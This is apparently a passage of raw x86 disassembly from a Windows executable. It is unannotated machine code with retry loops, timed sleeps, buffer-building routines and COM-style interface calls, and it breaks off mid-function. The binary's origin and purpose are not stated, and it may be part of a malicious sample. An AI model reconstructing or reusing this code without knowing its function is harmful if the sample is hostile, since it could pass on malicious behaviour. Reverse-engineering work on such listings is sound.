  40a433:	8d 85 00 c0 ff ff    	lea    -0x4000(%ebp),%eax
  40a439:	50                   	push   %eax
  40a43a:	ff 75 08             	push   0x8(%ebp)
  40a43d:	e8 03 fe ff ff       	call   0x40a245
  40a442:	83 c4 0c             	add    $0xc,%esp
  40a445:	8b d8                	mov    %eax,%ebx
  40a447:	83 ff 02             	cmp    $0x2,%edi
  40a44a:	75 17                	jne    0x40a463
  40a44c:	ff 75 14             	push   0x14(%ebp)
  40a44f:	8d 85 00 c0 ff ff    	lea    -0x4000(%ebp),%eax
  40a455:	50                   	push   %eax
  40a456:	ff 75 08             	push   0x8(%ebp)
  40a459:	e8 7b fe ff ff       	call   0x40a2d9
  40a45e:	83 c4 0c             	add    $0xc,%esp
  40a461:	8b d8                	mov    %eax,%ebx
  40a463:	8b c3                	mov    %ebx,%eax
  40a465:	5f                   	pop    %edi
  40a466:	5b                   	pop    %ebx
  40a467:	c9                   	leave
  40a468:	c3                   	ret
  40a469:	55                   	push   %ebp
  40a46a:	8b ec                	mov    %esp,%ebp
  40a46c:	51                   	push   %ecx
  40a46d:	51                   	push   %ecx
  40a46e:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  40a472:	85 c0                	test   %eax,%eax
  40a474:	53                   	push   %ebx
  40a475:	56                   	push   %esi
  40a476:	57                   	push   %edi
  40a477:	75 12                	jne    0x40a48b
  40a479:	0f b6 45 08          	movzbl 0x8(%ebp),%eax
  40a47d:	6b c0 14             	imul   $0x14,%eax,%eax
  40a480:	8b b8 d8 7e 42 00    	mov    0x427ed8(%eax),%edi
  40a486:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40a489:	eb 05                	jmp    0x40a490
  40a48b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40a48e:	8b f8                	mov    %eax,%edi
  40a490:	0f b6 75 08          	movzbl 0x8(%ebp),%esi
  40a494:	6b f6 14             	imul   $0x14,%esi,%esi
  40a497:	33 db                	xor    %ebx,%ebx
  40a499:	43                   	inc    %ebx
  40a49a:	85 be dc 7e 42 00    	test   %edi,0x427edc(%esi)
  40a4a0:	74 51                	je     0x40a4f3
  40a4a2:	3b fb                	cmp    %ebx,%edi
  40a4a4:	75 31                	jne    0x40a4d7
  40a4a6:	39 1d cc 7e 42 00    	cmp    %ebx,0x427ecc
  40a4ac:	75 49                	jne    0x40a4f7
  40a4ae:	8b 86 d0 7e 42 00    	mov    0x427ed0(%esi),%eax
  40a4b4:	85 c0                	test   %eax,%eax
  40a4b6:	74 3f                	je     0x40a4f7
  40a4b8:	8b 08                	mov    (%eax),%ecx
  40a4ba:	8d 55 08             	lea    0x8(%ebp),%edx
  40a4bd:	52                   	push   %edx
  40a4be:	50                   	push   %eax
  40a4bf:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  40a4c5:	85 c0                	test   %eax,%eax
  40a4c7:	7d 26                	jge    0x40a4ef
  40a4c9:	83 a6 d0 7e 42 00 00 	andl   $0x0,0x427ed0(%esi)
  40a4d0:	83 a6 dc 7e 42 00 fe 	andl   $0xfffffffe,0x427edc(%esi)
  40a4d7:	83 ff 02             	cmp    $0x2,%edi
  40a4da:	75 17                	jne    0x40a4f3
  40a4dc:	33 c0                	xor    %eax,%eax
  40a4de:	39 86 d4 7e 42 00    	cmp    %eax,0x427ed4(%esi)
  40a4e4:	75 09                	jne    0x40a4ef
  40a4e6:	83 a6 dc 7e 42 00 fd 	andl   $0xfffffffd,0x427edc(%esi)
  40a4ed:	eb 41                	jmp    0x40a530
  40a4ef:	8b c3                	mov    %ebx,%eax
  40a4f1:	eb 71                	jmp    0x40a564
  40a4f3:	3b fb                	cmp    %ebx,%edi
  40a4f5:	75 32                	jne    0x40a529
  40a4f7:	8d be d0 7e 42 00    	lea    0x427ed0(%esi),%edi
  40a4fd:	8b c7                	mov    %edi,%eax
  40a4ff:	e8 52 fc ff ff       	call   0x40a156
  40a504:	39 1d cc 7e 42 00    	cmp    %ebx,0x427ecc
  40a50a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40a50d:	75 14                	jne    0x40a523
  40a50f:	85 c0                	test   %eax,%eax
  40a511:	74 10                	je     0x40a523
  40a513:	8b 3f                	mov    (%edi),%edi
  40a515:	8b 07                	mov    (%edi),%eax
  40a517:	57                   	push   %edi
  40a518:	ff 50 04             	call   *0x4(%eax)
  40a51b:	09 9e dc 7e 42 00    	or     %ebx,0x427edc(%esi)
  40a521:	eb 3e                	jmp    0x40a561
  40a523:	83 27 00             	andl   $0x0,(%edi)
  40a526:	8b 7d fc             	mov    -0x4(%ebp),%edi
  40a529:	83 ff 02             	cmp    $0x2,%edi
  40a52c:	75 33                	jne    0x40a561
  40a52e:	33 c0                	xor    %eax,%eax
  40a530:	50                   	push   %eax
  40a531:	50                   	push   %eax
  40a532:	50                   	push   %eax
  40a533:	53                   	push   %ebx
  40a534:	50                   	push   %eax
  40a535:	ff 15 88 e1 40 00    	call   *0x40e188
  40a53b:	85 c0                	test   %eax,%eax
  40a53d:	89 86 d4 7e 42 00    	mov    %eax,0x427ed4(%esi)
  40a543:	74 1c                	je     0x40a561
  40a545:	6a 04                	push   $0x4
  40a547:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40a54a:	51                   	push   %ecx
  40a54b:	6a 41                	push   $0x41
  40a54d:	50                   	push   %eax
  40a54e:	89 5d 08             	mov    %ebx,0x8(%ebp)
  40a551:	ff 15 9c e1 40 00    	call   *0x40e19c
  40a557:	83 8e dc 7e 42 00 02 	orl    $0x2,0x427edc(%esi)
  40a55e:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40a561:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40a564:	5f                   	pop    %edi
  40a565:	5e                   	pop    %esi
  40a566:	5b                   	pop    %ebx
  40a567:	c9                   	leave
  40a568:	c3                   	ret
  40a569:	0f b6 c0             	movzbl %al,%eax
  40a56c:	6b c0 14             	imul   $0x14,%eax,%eax
  40a56f:	f6 80 dc 7e 42 00 01 	testb  $0x1,0x427edc(%eax)
  40a576:	74 07                	je     0x40a57f
  40a578:	8b 80 d0 7e 42 00    	mov    0x427ed0(%eax),%eax
  40a57e:	c3                   	ret
  40a57f:	33 c0                	xor    %eax,%eax
  40a581:	c3                   	ret
  40a582:	55                   	push   %ebp
  40a583:	8b ec                	mov    %esp,%ebp
  40a585:	83 ec 10             	sub    $0x10,%esp
  40a588:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40a58c:	0f b6 c0             	movzbl %al,%eax
  40a58f:	6b c0 14             	imul   $0x14,%eax,%eax
  40a592:	8b 88 d8 7e 42 00    	mov    0x427ed8(%eax),%ecx
  40a598:	85 88 dc 7e 42 00    	test   %ecx,0x427edc(%eax)
  40a59e:	75 04                	jne    0x40a5a4
  40a5a0:	33 c0                	xor    %eax,%eax
  40a5a2:	c9                   	leave
  40a5a3:	c3                   	ret
  40a5a4:	83 f9 01             	cmp    $0x1,%ecx
  40a5a7:	56                   	push   %esi
  40a5a8:	0f 85 91 00 00 00    	jne    0x40a63f
  40a5ae:	8b 80 d0 7e 42 00    	mov    0x427ed0(%eax),%eax
  40a5b4:	85 c0                	test   %eax,%eax
  40a5b6:	0f 84 9c 00 00 00    	je     0x40a658
  40a5bc:	8b 08                	mov    (%eax),%ecx
  40a5be:	8d 55 f8             	lea    -0x8(%ebp),%edx
  40a5c1:	52                   	push   %edx
  40a5c2:	50                   	push   %eax
  40a5c3:	ff 51 48             	call   *0x48(%ecx)
  40a5c6:	85 c0                	test   %eax,%eax
  40a5c8:	7c 71                	jl     0x40a63b
  40a5ca:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40a5cd:	8b 08                	mov    (%eax),%ecx
  40a5cf:	8d 55 f0             	lea    -0x10(%ebp),%edx
  40a5d2:	52                   	push   %edx
  40a5d3:	68 d8 e1 40 00       	push   $0x40e1d8
  40a5d8:	50                   	push   %eax
  40a5d9:	ff 11                	call   *(%ecx)
  40a5db:	8b f0                	mov    %eax,%esi
  40a5dd:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40a5e0:	8b 08                	mov    (%eax),%ecx
  40a5e2:	50                   	push   %eax
  40a5e3:	ff 51 08             	call   *0x8(%ecx)
  40a5e6:	85 f6                	test   %esi,%esi
  40a5e8:	7c 51                	jl     0x40a63b
  40a5ea:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40a5ed:	8b 08                	mov    (%eax),%ecx
  40a5ef:	8d 55 f4             	lea    -0xc(%ebp),%edx
  40a5f2:	52                   	push   %edx
  40a5f3:	50                   	push   %eax
  40a5f4:	ff 51 28             	call   *0x28(%ecx)
  40a5f7:	8b f0                	mov    %eax,%esi
  40a5f9:	85 f6                	test   %esi,%esi
  40a5fb:	7c 1b                	jl     0x40a618
  40a5fd:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40a600:	8b 08                	mov    (%eax),%ecx
  40a602:	8d 55 fc             	lea    -0x4(%ebp),%edx
  40a605:	52                   	push   %edx
  40a606:	50                   	push   %eax
  40a607:	ff 91 00 01 00 00    	call   *0x100(%ecx)
  40a60d:	8b f0                	mov    %eax,%esi
  40a60f:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40a612:	8b 08                	mov    (%eax),%ecx
  40a614:	50                   	push   %eax
  40a615:	ff 51 08             	call   *0x8(%ecx)
  40a618:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40a61b:	8b 08                	mov    (%eax),%ecx
  40a61d:	50                   	push   %eax
  40a61e:	ff 51 08             	call   *0x8(%ecx)
  40a621:	85 f6                	test   %esi,%esi
  40a623:	7c 16                	jl     0x40a63b
  40a625:	ff 75 fc             	push   -0x4(%ebp)
  40a628:	e8 24 ae ff ff       	call   0x405451
  40a62d:	85 c0                	test   %eax,%eax
  40a62f:	59                   	pop    %ecx
  40a630:	75 26                	jne    0x40a658
  40a632:	ff 75 fc             	push   -0x4(%ebp)
  40a635:	ff 15 00 e1 40 00    	call   *0x40e100
  40a63b:	33 c0                	xor    %eax,%eax
  40a63d:	eb 1c                	jmp    0x40a65b
  40a63f:	83 f9 02             	cmp    $0x2,%ecx
  40a642:	75 14                	jne    0x40a658
  40a644:	8b 80 e0 7e 42 00    	mov    0x427ee0(%eax),%eax
  40a64a:	85 c0                	test   %eax,%eax
  40a64c:	74 0a                	je     0x40a658
  40a64e:	50                   	push   %eax
  40a64f:	ff 15 08 e1 40 00    	call   *0x40e108
  40a655:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40a658:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a65b:	5e                   	pop    %esi
  40a65c:	c9                   	leave
  40a65d:	c3                   	ret
  40a65e:	85 c0                	test   %eax,%eax
  40a660:	75 0e                	jne    0x40a670
  40a662:	0f b6 44 24 04       	movzbl 0x4(%esp),%eax
  40a667:	6b c0 14             	imul   $0x14,%eax,%eax
  40a66a:	8b 80 d8 7e 42 00    	mov    0x427ed8(%eax),%eax
  40a670:	83 f8 01             	cmp    $0x1,%eax
  40a673:	75 48                	jne    0x40a6bd
  40a675:	56                   	push   %esi
  40a676:	0f b6 74 24 08       	movzbl 0x8(%esp),%esi
  40a67b:	6b f6 14             	imul   $0x14,%esi,%esi
  40a67e:	84 86 dc 7e 42 00    	test   %al,0x427edc(%esi)
  40a684:	74 36                	je     0x40a6bc
  40a686:	8b 86 d0 7e 42 00    	mov    0x427ed0(%esi),%eax
  40a68c:	85 c0                	test   %eax,%eax
  40a68e:	74 2c                	je     0x40a6bc
  40a690:	83 3d cc 7e 42 00 00 	cmpl   $0x0,0x427ecc
  40a697:	75 23                	jne    0x40a6bc
  40a699:	8b 08                	mov    (%eax),%ecx
  40a69b:	50                   	push   %eax
  40a69c:	ff 91 80 00 00 00    	call   *0x80(%ecx)
  40a6a2:	8b 86 d0 7e 42 00    	mov    0x427ed0(%esi),%eax
  40a6a8:	8b 08                	mov    (%eax),%ecx
  40a6aa:	50                   	push   %eax
  40a6ab:	ff 51 08             	call   *0x8(%ecx)
  40a6ae:	83 a6 dc 7e 42 00 fe 	andl   $0xfffffffe,0x427edc(%esi)
  40a6b5:	83 a6 d0 7e 42 00 00 	andl   $0x0,0x427ed0(%esi)
  40a6bc:	5e                   	pop    %esi
  40a6bd:	68 f4 01 00 00       	push   $0x1f4
  40a6c2:	ff 15 70 e0 40 00    	call   *0x40e070
  40a6c8:	c3                   	ret
  40a6c9:	56                   	push   %esi
  40a6ca:	be d0 7e 42 00       	mov    $0x427ed0,%esi
  40a6cf:	f6 46 0c 01          	testb  $0x1,0xc(%esi)
  40a6d3:	74 1a                	je     0x40a6ef
  40a6d5:	8b 06                	mov    (%esi),%eax
  40a6d7:	85 c0                	test   %eax,%eax
  40a6d9:	74 14                	je     0x40a6ef
  40a6db:	8b 08                	mov    (%eax),%ecx
  40a6dd:	50                   	push   %eax
  40a6de:	ff 91 80 00 00 00    	call   *0x80(%ecx)
  40a6e4:	8b 06                	mov    (%esi),%eax
  40a6e6:	8b 08                	mov    (%eax),%ecx
  40a6e8:	50                   	push   %eax
  40a6e9:	ff 51 08             	call   *0x8(%ecx)
  40a6ec:	83 26 00             	andl   $0x0,(%esi)
  40a6ef:	f6 46 0c 02          	testb  $0x2,0xc(%esi)
  40a6f3:	74 12                	je     0x40a707
  40a6f5:	8b 46 04             	mov    0x4(%esi),%eax
  40a6f8:	85 c0                	test   %eax,%eax
  40a6fa:	74 0b                	je     0x40a707
  40a6fc:	50                   	push   %eax
  40a6fd:	ff 15 94 e1 40 00    	call   *0x40e194
  40a703:	83 66 04 00          	andl   $0x0,0x4(%esi)
  40a707:	83 66 0c 00          	andl   $0x0,0xc(%esi)
  40a70b:	83 c6 14             	add    $0x14,%esi
  40a70e:	81 fe 98 7f 42 00    	cmp    $0x427f98,%esi
  40a714:	7c b9                	jl     0x40a6cf
  40a716:	5e                   	pop    %esi
  40a717:	c3                   	ret
  40a718:	81 ec 00 02 00 00    	sub    $0x200,%esp
  40a71e:	56                   	push   %esi
  40a71f:	57                   	push   %edi
  40a720:	33 ff                	xor    %edi,%edi
  40a722:	83 ff 05             	cmp    $0x5,%edi
  40a725:	7d 12                	jge    0x40a739
  40a727:	8b c7                	mov    %edi,%eax
  40a729:	8d 74 24 08          	lea    0x8(%esp),%esi
  40a72d:	e8 cd d2 ff ff       	call   0x4079ff
  40a732:	85 c0                	test   %eax,%eax
  40a734:	74 03                	je     0x40a739
  40a736:	47                   	inc    %edi
  40a737:	eb e9                	jmp    0x40a722
  40a739:	8b c7                	mov    %edi,%eax
  40a73b:	5f                   	pop    %edi
  40a73c:	5e                   	pop    %esi
  40a73d:	81 c4 00 02 00 00    	add    $0x200,%esp
  40a743:	c3                   	ret
  40a744:	53                   	push   %ebx
  40a745:	56                   	push   %esi
  40a746:	8b f0                	mov    %eax,%esi
  40a748:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40a74c:	33 d2                	xor    %edx,%edx
  40a74e:	8d 59 04             	lea    0x4(%ecx),%ebx
  40a751:	f7 f3                	div    %ebx
  40a753:	57                   	push   %edi
  40a754:	33 ff                	xor    %edi,%edi
  40a756:	47                   	inc    %edi
  40a757:	8b c2                	mov    %edx,%eax
  40a759:	85 c0                	test   %eax,%eax
  40a75b:	75 08                	jne    0x40a765
  40a75d:	39 54 24 10          	cmp    %edx,0x10(%esp)
  40a761:	74 02                	je     0x40a765
  40a763:	33 ff                	xor    %edi,%edi
  40a765:	3b c1                	cmp    %ecx,%eax
  40a767:	7d 07                	jge    0x40a770
  40a769:	e8 91 d2 ff ff       	call   0x4079ff
  40a76e:	eb 10                	jmp    0x40a780
  40a770:	2b c1                	sub    %ecx,%eax
  40a772:	8b 14 85 20 10 41 00 	mov    0x411020(,%eax,4),%edx
  40a779:	56                   	push   %esi
  40a77a:	e8 92 ad ff ff       	call   0x405511
  40a77f:	59                   	pop    %ecx
  40a780:	8b c7                	mov    %edi,%eax
  40a782:	5f                   	pop    %edi
  40a783:	5e                   	pop    %esi
  40a784:	5b                   	pop    %ebx
  40a785:	c3                   	ret
  40a786:	55                   	push   %ebp
  40a787:	8b ec                	mov    %esp,%ebp
  40a789:	81 ec 28 05 00 00    	sub    $0x528,%esp
  40a78f:	53                   	push   %ebx
  40a790:	56                   	push   %esi
  40a791:	33 f6                	xor    %esi,%esi
  40a793:	39 35 e4 14 41 00    	cmp    %esi,0x4114e4
  40a799:	57                   	push   %edi
  40a79a:	75 17                	jne    0x40a7b3
  40a79c:	eb 0b                	jmp    0x40a7a9
  40a79e:	68 10 27 00 00       	push   $0x2710
  40a7a3:	ff 15 70 e0 40 00    	call   *0x40e070
  40a7a9:	e8 66 c5 ff ff       	call   0x406d14
  40a7ae:	83 f8 01             	cmp    $0x1,%eax
  40a7b1:	75 eb                	jne    0x40a79e
  40a7b3:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  40a7b9:	50                   	push   %eax
  40a7ba:	ba 28 f4 40 00       	mov    $0x40f428,%edx
  40a7bf:	89 75 f8             	mov    %esi,-0x8(%ebp)
  40a7c2:	e8 4a ad ff ff       	call   0x405511
  40a7c7:	59                   	pop    %ecx
  40a7c8:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40a7cb:	b9 c1 02 00 00       	mov    $0x2c1,%ecx
  40a7d0:	e8 24 af ff ff       	call   0x4056f9
  40a7d5:	50                   	push   %eax
  40a7d6:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  40a7dc:	50                   	push   %eax
  40a7dd:	e8 47 ad ff ff       	call   0x405529
  40a7e2:	39 75 08             	cmp    %esi,0x8(%ebp)
  40a7e5:	59                   	pop    %ecx
  40a7e6:	59                   	pop    %ecx
  40a7e7:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40a7ea:	75 0c                	jne    0x40a7f8
  40a7ec:	66 c7 45 a4 30 00    	movw   $0x30,-0x5c(%ebp)
  40a7f2:	66 89 75 a6          	mov    %si,-0x5a(%ebp)
  40a7f6:	eb 08                	jmp    0x40a800
  40a7f8:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a7fb:	e8 f9 ae ff ff       	call   0x4056f9
  40a800:	50                   	push   %eax
  40a801:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  40a807:	50                   	push   %eax
  40a808:	e8 1c ad ff ff       	call   0x405529
  40a80d:	39 75 0c             	cmp    %esi,0xc(%ebp)
  40a810:	59                   	pop    %ecx
  40a811:	59                   	pop    %ecx
  40a812:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40a815:	75 0c                	jne    0x40a823
  40a817:	66 c7 45 a4 30 00    	movw   $0x30,-0x5c(%ebp)
  40a81d:	66 89 75 a6          	mov    %si,-0x5a(%ebp)
  40a821:	eb 08                	jmp    0x40a82b
  40a823:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40a826:	e8 ce ae ff ff       	call   0x4056f9
  40a82b:	50                   	push   %eax
  40a82c:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  40a832:	50                   	push   %eax
  40a833:	e8 f1 ac ff ff       	call   0x405529
  40a838:	59                   	pop    %ecx
  40a839:	59                   	pop    %ecx
  40a83a:	e8 76 c4 ff ff       	call   0x406cb5
  40a83f:	8b c8                	mov    %eax,%ecx
  40a841:	3b ce                	cmp    %esi,%ecx
  40a843:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40a846:	75 0c                	jne    0x40a854
  40a848:	66 c7 45 a4 30 00    	movw   $0x30,-0x5c(%ebp)
  40a84e:	66 89 75 a6          	mov    %si,-0x5a(%ebp)
  40a852:	eb 05                	jmp    0x40a859
  40a854:	e8 a0 ae ff ff       	call   0x4056f9
  40a859:	50                   	push   %eax
  40a85a:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  40a860:	50                   	push   %eax
  40a861:	e8 c3 ac ff ff       	call   0x405529
  40a866:	8d 85 dc fc ff ff    	lea    -0x324(%ebp),%eax
  40a86c:	56                   	push   %esi
  40a86d:	50                   	push   %eax
  40a86e:	e8 58 d0 ff ff       	call   0x4078cb
  40a873:	83 c4 10             	add    $0x10,%esp
  40a876:	e8 9d fe ff ff       	call   0x40a718
  40a87b:	89 45 08             	mov    %eax,0x8(%ebp)
  40a87e:	33 db                	xor    %ebx,%ebx
  40a880:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a883:	53                   	push   %ebx
  40a884:	8d 85 dc fa ff ff    	lea    -0x524(%ebp),%eax
  40a88a:	e8 b5 fe ff ff       	call   0x40a744
  40a88f:	85 c0                	test   %eax,%eax
  40a891:	59                   	pop    %ecx
  40a892:	75 0b                	jne    0x40a89f
  40a894:	68 60 ea 00 00       	push   $0xea60
  40a899:	ff 15 70 e0 40 00    	call   *0x40e070
  40a89f:	56                   	push   %esi
  40a8a0:	8d 85 dc fc ff ff    	lea    -0x324(%ebp),%eax
  40a8a6:	50                   	push   %eax
  40a8a7:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  40a8ad:	50                   	push   %eax
  40a8ae:	8d 85 dc fa ff ff    	lea    -0x524(%ebp),%eax
  40a8b4:	50                   	push   %eax
  40a8b5:	8d 7d f8             	lea    -0x8(%ebp),%edi
  40a8b8:	e8 ac c5 ff ff       	call   0x406e69
  40a8bd:	8b f8                	mov    %eax,%edi
  40a8bf:	83 c4 10             	add    $0x10,%esp
  40a8c2:	83 ff 01             	cmp    $0x1,%edi
  40a8c5:	74 0b                	je     0x40a8d2
  40a8c7:	68 10 27 00 00       	push   $0x2710
  40a8cc:	ff 15 70 e0 40 00    	call   *0x40e070
  40a8d2:	43                   	inc    %ebx
  40a8d3:	3b fe                	cmp    %esi,%edi
  40a8d5:	74 05                	je     0x40a8dc
  40a8d7:	83 ff 02             	cmp    $0x2,%edi
  40a8da:	75 05                	jne    0x40a8e1
  40a8dc:	3b 5d 10             	cmp    0x10(%ebp),%ebx
  40a8df:	7c 9f                	jl     0x40a880
  40a8e1:	ff 75 f8             	push   -0x8(%ebp)
  40a8e4:	56                   	push   %esi
  40a8e5:	ff 15 d0 e0 40 00    	call   *0x40e0d0
  40a8eb:	50                   	push   %eax
  40a8ec:	ff 15 a8 e0 40 00    	call   *0x40e0a8
  40a8f2:	8b c7                	mov    %edi,%eax
  40a8f4:	5f                   	pop    %edi
  40a8f5:	5e                   	pop    %esi
  40a8f6:	5b                   	pop    %ebx
  40a8f7:	c9                   	leave
  40a8f8:	c3                   	ret
  40a8f9:	55                   	push   %ebp
  40a8fa:	8b ec                	mov    %esp,%ebp
  40a8fc:	b8 18 13 00 00       	mov    $0x1318,%eax
  40a901:	e8 aa 2c 00 00       	call   0x40d5b0
  40a906:	53                   	push   %ebx
  40a907:	56                   	push   %esi
  40a908:	33 f6                	xor    %esi,%esi
  40a90a:	39 35 e4 14 41 00    	cmp    %esi,0x4114e4
  40a910:	57                   	push   %edi
  40a911:	8b f9                	mov    %ecx,%edi
  40a913:	75 17                	jne    0x40a92c
  40a915:	eb 0b                	jmp    0x40a922
  40a917:	68 10 27 00 00       	push   $0x2710
  40a91c:	ff 15 70 e0 40 00    	call   *0x40e070
  40a922:	e8 ed c3 ff ff       	call   0x406d14
  40a927:	83 f8 01             	cmp    $0x1,%eax
  40a92a:	75 eb                	jne    0x40a917
  40a92c:	3b fe                	cmp    %esi,%edi
  40a92e:	8b 45 0c             	mov    0xc(%ebp),%eax
  40a931:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a934:	8d 1c 01             	lea    (%ecx,%eax,1),%ebx
  40a937:	89 75 0c             	mov    %esi,0xc(%ebp)
  40a93a:	74 0d                	je     0x40a949
  40a93c:	8d 95 e8 ec ff ff    	lea    -0x1318(%ebp),%edx
  40a942:	e8 03 c8 ff ff       	call   0x40714a
  40a947:	eb 07                	jmp    0x40a950
  40a949:	66 89 b5 e8 ec ff ff 	mov    %si,-0x1318(%ebp)
  40a950:	8d 85 e8 f4 ff ff    	lea    -0xb18(%ebp),%eax
  40a956:	50                   	push   %eax
  40a957:	ba 78 f4 40 00       	mov    $0x40f478,%edx
  40a95c:	e8 b0 ab ff ff       	call   0x405511
  40a961:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40a964:	b9 c1 02 00 00       	mov    $0x2c1,%ecx
  40a969:	e8 8b ad ff ff       	call   0x4056f9
  40a96e:	50                   	push   %eax
  40a96f:	8d 85 e8 f4 ff ff    	lea    -0xb18(%ebp),%eax
  40a975:	50                   	push   %eax
  40a976:	e8 ae ab ff ff       	call   0x405529
  40a97b:	83 c4 0c             	add    $0xc,%esp
  40a97e:	3b de                	cmp    %esi,%ebx
  40a980:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40a983:	75 0c                	jne    0x40a991
  40a985:	66 c7 45 b0 30 00    	movw   $0x30,-0x50(%ebp)
  40a98b:	66 89 75 b2          	mov    %si,-0x4e(%ebp)
  40a98f:	eb 07                	jmp    0x40a998
  40a991:	8b cb                	mov    %ebx,%ecx
  40a993:	e8 61 ad ff ff       	call   0x4056f9
  40a998:	50                   	push   %eax
  40a999:	8d 85 e8 f4 ff ff    	lea    -0xb18(%ebp),%eax
  40a99f:	50                   	push   %eax
  40a9a0:	e8 84 ab ff ff       	call   0x405529
  40a9a5:	8d 85 e8 ec ff ff    	lea    -0x1318(%ebp),%eax
  40a9ab:	50                   	push   %eax
  40a9ac:	8d 85 e8 f4 ff ff    	lea    -0xb18(%ebp),%eax
  40a9b2:	50                   	push   %eax
  40a9b3:	e8 71 ab ff ff       	call   0x405529
  40a9b8:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40a9bb:	83 c4 10             	add    $0x10,%esp
  40a9be:	3b ce                	cmp    %esi,%ecx
  40a9c0:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40a9c3:	75 0c                	jne    0x40a9d1
  40a9c5:	66 c7 45 b0 30 00    	movw   $0x30,-0x50(%ebp)
  40a9cb:	66 89 75 b2          	mov    %si,-0x4e(%ebp)
  40a9cf:	eb 05                	jmp    0x40a9d6
  40a9d1:	e8 23 ad ff ff       	call   0x4056f9
  40a9d6:	50                   	push   %eax
  40a9d7:	8d 85 e8 f4 ff ff    	lea    -0xb18(%ebp),%eax
  40a9dd:	50                   	push   %eax
  40a9de:	e8 46 ab ff ff       	call   0x405529
  40a9e3:	59                   	pop    %ecx
  40a9e4:	59                   	pop    %ecx
  40a9e5:	8b 4d 18             	mov    0x18(%ebp),%ecx
  40a9e8:	3b ce                	cmp    %esi,%ecx
  40a9ea:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40a9ed:	75 0c                	jne    0x40a9fb
  40a9ef:	66 c7 45 b0 30 00    	movw   $0x30,-0x50(%ebp)
  40a9f5:	66 89 75 b2          	mov    %si,-0x4e(%ebp)
  40a9f9:	eb 05                	jmp    0x40aa00
  40a9fb:	e8 f9 ac ff ff       	call   0x4056f9
  40aa00:	50                   	push   %eax
  40aa01:	8d 85 e8 f4 ff ff    	lea    -0xb18(%ebp),%eax
  40aa07:	50                   	push   %eax
  40aa08:	e8 1c ab ff ff       	call   0x405529
  40aa0d:	8b 7d 10             	mov    0x10(%ebp),%edi
  40aa10:	3b fe                	cmp    %esi,%edi
  40aa12:	59                   	pop    %ecx
  40aa13:	59                   	pop    %ecx
  40aa14:	74 0d                	je     0x40aa23
  40aa16:	8d 95 e8 ec ff ff    	lea    -0x1318(%ebp),%edx
  40aa1c:	e8 29 c7 ff ff       	call   0x40714a
  40aa21:	eb 07                	jmp    0x40aa2a
  40aa23:	66 89 b5 e8 ec ff ff 	mov    %si,-0x1318(%ebp)
  40aa2a:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
  40aa30:	56                   	push   %esi
  40aa31:	50                   	push   %eax
  40aa32:	e8 94 ce ff ff       	call   0x4078cb
  40aa37:	8d 85 e8 ec ff ff    	lea    -0x1318(%ebp),%eax
  40aa3d:	50                   	push   %eax
  40aa3e:	8d 85 e8 f4 ff ff    	lea    -0xb18(%ebp),%eax
  40aa44:	50                   	push   %eax
  40aa45:	e8 df aa ff ff       	call   0x405529
  40aa4a:	83 c4 10             	add    $0x10,%esp
  40aa4d:	e8 63 c2 ff ff       	call   0x406cb5
  40aa52:	8b c8                	mov    %eax,%ecx
  40aa54:	3b ce                	cmp    %esi,%ecx
  40aa56:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40aa59:	75 0c                	jne    0x40aa67
  40aa5b:	66 c7 45 b0 30 00    	movw   $0x30,-0x50(%ebp)
  40aa61:	66 89 75 b2          	mov    %si,-0x4e(%ebp)
  40aa65:	eb 05                	jmp    0x40aa6c
  40aa67:	e8 8d ac ff ff       	call   0x4056f9
  40aa6c:	50                   	push   %eax
  40aa6d:	8d 85 e8 f4 ff ff    	lea    -0xb18(%ebp),%eax
  40aa73:	50                   	push   %eax
  40aa74:	e8 b0 aa ff ff       	call   0x405529
  40aa79:	e8 9a fc ff ff       	call   0x40a718
  40aa7e:	8b c8                	mov    %eax,%ecx
  40aa80:	56                   	push   %esi
  40aa81:	8d 85 e8 fc ff ff    	lea    -0x318(%ebp),%eax
  40aa87:	89 4d 08             	mov    %ecx,0x8(%ebp)
  40aa8a:	33 db                	xor    %ebx,%ebx
  40aa8c:	e8 b3 fc ff ff       	call   0x40a744
  40aa91:	83 c4 0c             	add    $0xc,%esp
  40aa94:	56                   	push   %esi
  40aa95:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
  40aa9b:	50                   	push   %eax
  40aa9c:	8d 85 e8 f4 ff ff    	lea    -0xb18(%ebp),%eax
  40aaa2:	50                   	push   %eax
  40aaa3:	8d 85 e8 fc ff ff    	lea    -0x318(%ebp),%eax
  40aaa9:	50                   	push   %eax
